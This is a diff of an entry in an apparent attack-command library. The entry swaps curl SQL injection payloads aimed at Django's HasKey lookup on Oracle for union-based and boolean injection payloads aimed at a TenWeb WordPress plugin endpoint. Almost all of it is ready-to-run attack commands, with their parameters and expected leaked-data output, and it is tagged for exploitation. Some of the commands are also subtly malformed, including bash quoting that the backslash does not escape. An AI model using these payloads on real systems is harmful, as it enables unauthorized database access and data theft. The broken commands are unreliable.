@@ -1,67 +1,64 @@
 ---
-id: uuid-curl-payload
-data: >-
-  curl -X POST "http://target.com/api/query" -d '{"lhs": "nonexistent'); SELECT
-  COUNT(*) FROM ALL_TABLES; --", "rhs": "data"}' -H "Content-Type:
-  application/json" -v
-tags:
-  - sqli
-  - exploitation
-  - web
+id: command-uuid-1
+name: curl-sqli-payload
 type: command
-output: null
 executor: bash
+data: >-
+  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\'
+  UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
+output: null
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:24:08.533Z'
 platforms:
   - Linux
   - macOS
   - Windows
-created_at: '2024-12-05T00:00:00Z'
-updated_at: '2025-12-14T03:16:24.913Z'
+tags:
+  - sqli
+  - web-exploit
 verified: false
 validated: true
 submitted: true
 ---
+
 # curl-sqli-payload
 
 ## Command
 
 ```bash
-curl -X POST "http://target.com/api/query" -d '{"lhs": "nonexistent'); SELECT COUNT(*) FROM ALL_TABLES; --", "rhs": "data"}' -H "Content-Type: application/json" -v
+curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\' UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
 
 ## Description
 
-This command sends a crafted JSON payload to exploit SQL injection in Django's HasKey lhs parameter on Oracle, injecting arbitrary SQL to execute and return results via the web response.
+This command sends a POST request to the vulnerable TenWeb endpoint with a SQL injection payload to test for union-based injection, useful for confirming SQLi in WordPress plugins.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | HTTP POST method | Yes |
-| `URL` | Vulnerable endpoint | Yes |
-| `-d` | JSON payload with malicious lhs | Yes |
-| `-H` | Content-Type header | Yes |
-| `-v` | Verbose output | Yes |
+| `-X POST` | Specifies HTTP POST method | Yes |
+| `-d 'url=...'` | Payload data for injection | Yes |
+| `-H 'Content-Type: ...'` | Sets request header | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST "http://target.com/api/query" -d '{"lhs": "test'); SELECT 1; --", "rhs": "field"}' -H "Content-Type: application/json" -v
+curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\' UNION SELECT 1,2,3--' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST "http://target.com/api/query" -d '{"lhs": "key'); SELECT username FROM users; --", "rhs": "jsonfield"}' -H "Content-Type: application/json" --data-urlencode -v
+curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' AND 1=1--' -H 'Content-Type: application/x-www-form-urlencoded' -v
 ```
 
 ## Expected Output
 
-Response body containing injected query results, such as table counts or data dumps, mixed with normal JSON output.
+HTTP response with JSON or error indicating SQL execution, such as "MySQL syntax error" or leaked data in body.
 
 ## Related
 
-- [[commands/curl-identify-endpoint]]
-- [[procedures/Exploit-Django-HasKey-SQL-Injection]]
+- [[Related Procedure: Exploit-Unauthenticated-SQL-Injection-in-TenWeb-Endpoint]]
